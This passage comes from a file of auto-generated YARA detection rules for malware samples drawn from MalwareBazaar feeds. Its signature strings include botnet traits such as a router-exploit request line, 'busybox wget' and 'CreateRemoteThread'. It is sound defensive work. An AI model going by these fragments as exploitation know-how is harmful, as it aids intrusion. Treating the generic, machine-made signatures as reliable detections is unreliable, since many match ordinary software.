        $s12 = "file exists"
        $s13 = "file too large"
        $s14 = "filename too long"
        $s15 = "network reset"
        $s16 = "no child process"
        $s17 = "no such file or directory"
        $s18 = "no such process"
        $s19 = "not a socket"
        $s20 = "not connected"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 539KB and
        all of them
}

rule Linux_d8dacd3921a016ab597a8ffcf0aaa9496b3aef0c6b8c089511a37ffc34d1518c
{
    meta:
        description = "Auto ML: d8dacd3921a016ab597a8ffcf0aaa9496b3aef0c6b8c089511a37ffc34d1518c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "(!PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB and
        all of them
}

rule Windows_155e65ea8e6ecf962ae78503325472bb78dd787d043245cc31ef821b14370ac9
{
    meta:
        description = "Auto ML: 155e65ea8e6ecf962ae78503325472bb78dd787d043245cc31ef821b14370ac9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2258KB and
        all of them
}

rule Windows_d8e4ee9b8049923e2c996216c5718b3ff0913c4b6b3d6461ad91fafebcde733c
{
    meta:
        description = "Auto ML: d8e4ee9b8049923e2c996216c5718b3ff0913c4b6b3d6461ad91fafebcde733c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Diagram.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "ConnectionProvider"
        $s8 = "ConfigReader"
        $s9 = "FileScanning"
        $s10 = "FileSearcher"
        $s11 = "OpenVPN"
        $s12 = "System.Windows.Forms"
        $s13 = "QueryProcessor"
        $s14 = "QueryCmd"
        $s15 = "DownloadAndExecuteUpdate"
        $s16 = "DownloadUpdate"
        $s17 = "OpenUpdate"
        $s18 = "FileExt"
        $s19 = "UserExt"
        $s20 = "FileUtil"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 300KB and
        all of them
}

rule Windows_d8ff842cb1d1de484e05019ad29310d492271ce2aa84ac50dd937b61876e857e
{
    meta:
        description = "Auto ML: d8ff842cb1d1de484e05019ad29310d492271ce2aa84ac50dd937b61876e857e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "attempts."
        $s6 = "You are getting closer."
        $s7 = "You are very close!"
        $s8 = "attempts. The correct number was"
        $s9 = "ios_base::badbit set"
        $s10 = "ios_base::failbit set"
        $s11 = "ios_base::eofbit set"
        $s12 = "already connected"
        $s13 = "bad file descriptor"
        $s14 = "connection aborted"
        $s15 = "connection already in progress"
        $s16 = "connection refused"
        $s17 = "connection reset"
        $s18 = "file exists"
        $s19 = "file too large"
        $s20 = "filename too long"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 467KB and
        all of them
}

rule Windows_d93f26b4353118be388e543532f5df1357179d337bf902690b878c9d8ff5af4e
{
    meta:
        description = "Auto ML: d93f26b4353118be388e543532f5df1357179d337bf902690b878c9d8ff5af4e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "RegSetValueExW"
        $s8 = "RegCloseKey"
        $s9 = "RegDeleteValueW"
        $s10 = "RegDeleteKeyW"
        $s11 = "OpenProcessToken"
        $s12 = "SetFileSecurityW"
        $s13 = "RegOpenKeyExW"
        $s14 = "RegCreateKeyExW"
        $s15 = "ADVAPI32.dll"
        $s16 = "SHFileOperationW"
        $s17 = "SHGetFileInfoW"
        $s18 = "SHGetPathFromIDListW"
        $s19 = "ShellExecuteExW"
        $s20 = "SHGetSpecialFolderLocation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 622KB and
        all of them
}

rule Windows_d9814ac2cfa7d3baafe11e4807c6033314a828ab3236a45fad9a39894d6883e0
{
    meta:
        description = "Auto ML: d9814ac2cfa7d3baafe11e4807c6033314a828ab3236a45fad9a39894d6883e0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "libgcc_s_dw2-1.dll"
        $s7 = "Error, failed to open '%ls' for writing."
        $s8 = "Error, couldn't unpack file to target path."
        $s9 = "NUITKA_ONEFILE_PARENT"
        $s10 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p."
        $s11 = "CloseHandle"
        $s12 = "CopyFileW"
        $s13 = "CreateDirectoryW"
        $s14 = "CreateFileMappingW"
        $s15 = "CreateFileW"
        $s16 = "CreateProcessW"
        $s17 = "DeleteCriticalSection"
        $s18 = "DeleteFileW"
        $s19 = "GetCommandLineW"
        $s20 = "GetCurrentProcessId"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17543KB and
        all of them
}

rule Linux_d98c4799382028417b78db4bebf133b2994034730efb84cae8c67d5bb5bd19f1
{
    meta:
        description = "Auto ML: d98c4799382028417b78db4bebf133b2994034730efb84cae8c67d5bb5bd19f1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 62KB and
        all of them
}

rule Windows_d993da5b179af8c4c4a3a29ba72182f51e47311205c7830f9cca88ec71328240
{
    meta:
        description = "Auto ML: d993da5b179af8c4c4a3a29ba72182f51e47311205c7830f9cca88ec71328240"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "GAIsProcessorFeaturePresent"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 202KB and
        all of them
}

rule Windows_d994b443d34c7933099d1e819dc27b5c2a87ee946b21d769bf8f13f6c5e5ed1d
{
    meta:
        description = "Auto ML: d994b443d34c7933099d1e819dc27b5c2a87ee946b21d769bf8f13f6c5e5ed1d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetNextControl>b__30_10"
        $s5 = "<GetNextControl>b__30_0"
        $s6 = "<set_BackgroundPressed9P>b__21_0"
        $s7 = "<set_BackgroundNormal9P>b__13_0"
        $s8 = "<set_BackgroundCheckedPressed9P>b__33_0"
        $s9 = "<set_BackgroundCheckedNormal9P>b__25_0"
        $s10 = "<set_BackgroundOver9P>b__17_0"
        $s11 = "<set_BackgroundCheckedOver9P>b__29_0"
        $s12 = "<SetLayout>b__9_0"
        $s13 = "<SetImage>b__0"
        $s14 = "<SetNinePatch>b__0"
        $s15 = "<GetNextControl>b__30_11"
        $s16 = "<GetNextControl>b__30_1"
        $s17 = "<SetNinePatch>b__13_1"
        $s18 = "<SetImage>b__14_1"
        $s19 = "<SetLayout>b__9_1"
        $s20 = "ReadOnlyCollection`1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 777KB and
        all of them
}

rule Windows_d9c84cb774cb69a853abf29df256adadb039ac9db07d4a042ce3d12620add5c3
{
    meta:
        description = "Auto ML: d9c84cb774cb69a853abf29df256adadb039ac9db07d4a042ce3d12620add5c3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 320KB and
        all of them
}

rule Windows_d9e39ac3bdf2a36aab090ab6dbe0edf6c4176746dc8ab32bc9fa76c57834bad4
{
    meta:
        description = "Auto ML: d9e39ac3bdf2a36aab090ab6dbe0edf6c4176746dc8ab32bc9fa76c57834bad4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1242KB and
        all of them
}

rule Windows_da0c31cfb509c2cf25b035047ae02faa18149e12cf47466cda1cd8b3dfc0e7ef
{
    meta:
        description = "Auto ML: da0c31cfb509c2cf25b035047ae02faa18149e12cf47466cda1cd8b3dfc0e7ef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "Kingdom.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{6799CF72-E371-4A62-AD7F-9E17F8CB5451}"
        $s15 = "x1DPnsNKH3E8ssEtQv"
        $s16 = "<Module>{7b64bfaa-9945-4f42-8d45-934b6f88064d}"
        $s17 = "get_Days"
        $s18 = "kernel32.dll"
        $s19 = "CreateThread"
        $s20 = "get_Message"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 358KB and
        all of them
}

rule Windows_156e13c6490c8301b32f8002b493756b705267eb7c5463e673b905fe265f7470
{
    meta:
        description = "Auto ML: 156e13c6490c8301b32f8002b493756b705267eb7c5463e673b905fe265f7470"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "ThreadSafeObjectProvider`1"
        $s6 = "kernel32"
        $s7 = "Microsoft.Win32"
        $s8 = "user32"
        $s9 = "<Module>"
        $s10 = "GetVolumeInformationA"
        $s11 = "capGetDriverDescriptionA"
        $s12 = "System.IO"
        $s13 = "Create__Instance__"
        $s14 = "System.Collections.Generic"
        $s15 = "Read"
        $s16 = "Thread"
        $s17 = "Load"
        $s18 = "get_IsDisposed"
        $s19 = "m_FormBeingCreated"
        $s20 = "TargetMethod"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 48KB and
        all of them
}

rule Linux_da110c064198aaf76bd0e6dd42108d40ed13aecd3c94a404c61f142bc5408504
{
    meta:
        description = "Auto ML: da110c064198aaf76bd0e6dd42108d40ed13aecd3c94a404c61f142bc5408504"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 161KB and
        all of them
}

rule Windows_da13f66fcc1656d7c8e1b767574c3e0738e74b2be244ab7d8742cd288277e7ab
{
    meta:
        description = "Auto ML: da13f66fcc1656d7c8e1b767574c3e0738e74b2be244ab7d8742cd288277e7ab"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4762KB and
        all of them
}

rule Linux_da213006b4b1e1320baf8dec0c35c776f20a5e7ccc684363fd7f74547ce04f24
{
    meta:
        description = "Auto ML: da213006b4b1e1320baf8dec0c35c776f20a5e7ccc684363fd7f74547ce04f24"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 43KB and
        all of them
}

rule Windows_da2e82a165342cbabe9bfcc46865d2fc2b707914905ea174bb444588a2780bd3
{
    meta:
        description = "Auto ML: da2e82a165342cbabe9bfcc46865d2fc2b707914905ea174bb444588a2780bd3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "Liberty.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{7502F221-007A-42A3-8D41-CDAF4817A3E4}"
        $s15 = "Ni9ht0izeG0YtgkySEt"
        $s16 = "<Module>{606ec3a2-8623-4df8-91ee-87af648cfc94}"
        $s17 = "kernel32.dll"
        $s18 = "CreateRemoteThread"
        $s19 = "System.Threading.Tasks"
        $s20 = "Module"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 636KB and
        all of them
}

rule Windows_da58a7dd541fd3b0b3b8f7cb7dcf85e4c3dbf1ef8503f5503edccbc644bc2611
{
    meta:
        description = "Auto ML: da58a7dd541fd3b0b3b8f7cb7dcf85e4c3dbf1ef8503f5503edccbc644bc2611"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s7 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s9 = "Failed to extract %s: failed to read data chunk!"
        $s10 = "fread"
        $s11 = "Failed to extract %s: failed to write data chunk!"
        $s12 = "fwrite"
        $s13 = "Failed to extract %s: failed to open archive file!"
        $s14 = "pyi_arch_extract2fs was called before temporary directory was initialized!"
        $s15 = "Failed to create symbolic link %s!"
        $s16 = "Failed to extract %s: failed to open target file!"
        $s17 = "fopen"
        $s18 = "Failed to read cookie!"
        $s19 = "Could not read full TOC!"
        $s20 = "Error on file."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 50582KB and
        all of them
}

rule Windows_da82319d644e8316e8271b697d5c5df9e20d7edba7f61aafca3c0e2b94440899
{
    meta:
        description = "Auto ML: da82319d644e8316e8271b697d5c5df9e20d7edba7f61aafca3c0e2b94440899"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "processorArchitecture=\"X86\""
        $s4 = "name=\"Enigma.exe\""
        $s5 = "type=\"win32\" />"
        $s6 = "type=\"win32\""
        $s7 = "name=\"Microsoft.Windows.Common-Controls\""
        $s8 = "processorArchitecture=\"X86\""
        $s9 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s10 = "http://pki-ocsp.symauth.com0"
        $s11 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s12 = "kernel32.dll"
        $s13 = "user32.dll"
        $s14 = "advapi32.dll"
        $s15 = "oleaut32.dll"
        $s16 = "shell32.dll"
        $s17 = "version.dll"
        $s18 = "CRYPT32.dll"
        $s19 = "SHLWAPI.dll"
        $s20 = "gdiplus.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1832KB and
        all of them
}

rule Windows_da8c10c9df64141f2e0eccea6bd14a3d836b49e83d6681dcb849d8991a0b44a0
{
    meta:
        description = "Auto ML: da8c10c9df64141f2e0eccea6bd14a3d836b49e83d6681dcb849d8991a0b44a0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "GetProcAddress"
        $s7 = "GetSystemTimeAsFileTime"
        $s8 = "GetModuleHandleA"
        $s9 = "LoadLibraryA"
        $s10 = "GetDC"
        $s11 = "KERNEL32.dll"
        $s12 = "5+TCmDn~"
        $s13 = "ZM/BWin"
        $s14 = "ExitProcess"
        $s15 = "USER32.dll"
        $s16 = "profileManagerWW"
        $s17 = "appSettingsManagerWW"
        $s18 = "sendToVirtualSystemControlWW"
        $s19 = "getSystemPowerStatus"
        $s20 = "systemPowerStatusChanged"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 5962KB and
        all of them
}

rule Windows_daa74b36d89c37396f2df487ad202f513ea6779793e7a3fc6243d33d8f82fbea
{
    meta:
        description = "Auto ML: daa74b36d89c37396f2df487ad202f513ea6779793e7a3fc6243d33d8f82fbea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4606KB and
        all of them
}

rule Windows_daa8db2383e3d9fe6cc680385e04fd9aeecee60bc13a4d7c75e55d8d40258d58
{
    meta:
        description = "Auto ML: daa8db2383e3d9fe6cc680385e04fd9aeecee60bc13a4d7c75e55d8d40258d58"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 684KB and
        all of them
}

rule Windows_dafd45f3a2c91c287da7690b5688bf1b0af06d48ce91335c04425943a62a82f8
{
    meta:
        description = "Auto ML: dafd45f3a2c91c287da7690b5688bf1b0af06d48ce91335c04425943a62a82f8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_MaNV"
        $s6 = "set_MaNV"
        $s7 = "get_TenNV"
        $s8 = "set_TenNV"
        $s9 = "LoadData"
        $s10 = "get_UserId"
        $s11 = "set_UserId"
        $s12 = "get_DiaryId"
        $s13 = "set_DiaryId"
        $s14 = "frmAdd_Load"
        $s15 = "add_Load"
        $s16 = "frmLogin_Load"
        $s17 = "frmList_Load"
        $s18 = "get_Checked"
        $s19 = "set_FormattingEnabled"
        $s20 = "<UserId>k__BackingField"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 722KB and
        all of them
}

rule Windows_1574b3cafdacf7e9738e58c9b77b8fc7ccbcc8f152c246f704e45121e9ea4443
{
    meta:
        description = "Auto ML: 1574b3cafdacf7e9738e58c9b77b8fc7ccbcc8f152c246f704e45121e9ea4443"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "shfolder.dll"
        $s4 = "USER32.dll"
        $s5 = "pGeT>"
        $s6 = "SHGetFolderPathA"
        $s7 = "SetThreadAffinityMask"
        $s8 = "ShellExecuteA"
        $s9 = "LoadLibraryA"
        $s10 = "kernel32.dll"
        $s11 = "WTSAPI32.dll"
        $s12 = "GetUserObjectInformationW"
        $s13 = "GetCurrentThreadId"
        $s14 = "ExitProcess"
        $s15 = "GetProcAddress"
        $s16 = "SetProcessAffinityMask"
        $s17 = "GetModuleHandleA"
        $s18 = "WriteFile"
        $s19 = "shell32.dll"
        $s20 = "GetProcessAffinityMask"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6362KB and
        all of them
}

rule Windows_daff6ed76092cbee2ba195c52fe0d91888910706a5a43629973dc5aa19cccf86
{
    meta:
        description = "Auto ML: daff6ed76092cbee2ba195c52fe0d91888910706a5a43629973dc5aa19cccf86"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1541KB and
        all of them
}

rule Windows_db166d0df8c59f9292ac47d5ae910cee4f85407a8208d0c2743ef85ae752ff85
{
    meta:
        description = "Auto ML: db166d0df8c59f9292ac47d5ae910cee4f85407a8208d0c2743ef85ae752ff85"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Whxhh.exe"
        $s5 = "<Module>"
        $s6 = "FieldManagerWriter"
        $s7 = "Whxhh.Writers"
        $s8 = "System"
        $s9 = "PropertyManagerWriter"
        $s10 = "IsReadOnlyAttribute"
        $s11 = "System.Runtime.CompilerServices"
        $s12 = "DescriptorRegistryCollection`1"
        $s13 = "IssuerManagerWriter"
        $s14 = "System.Collections.ObjectModel"
        $s15 = "Processor"
        $s16 = "WriterSingletonManager"
        $s17 = "<ReaderReadAndAssertAsync>d__2"
        $s18 = "<ReadArrayIntoByteArrayAsync>d__5"
        $s19 = "<ReadAndMoveToContentAsync>d__12"
        $s20 = "<DoReadAsync>d__3"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2536KB and
        all of them
}

rule Windows_db527c3116d3f996e6648ad18e91959156f192e58c31499b899468c495f3ce9f
{
    meta:
        description = "Auto ML: db527c3116d3f996e6648ad18e91959156f192e58c31499b899468c495f3ce9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.rsrc"
        $s6 = "@.reloc"
        $s7 = "KikiWinSockCQueue *"
        $s8 = "TRegistry *[2]"
        $s9 = "TRegistry *"
        $s10 = "KikiWinSockCQueue"
        $s11 = "TRegistry"
        $s12 = "TScrollingWinControl"
        $s13 = "TWinControl"
        $s14 = "KikiStringFile *"
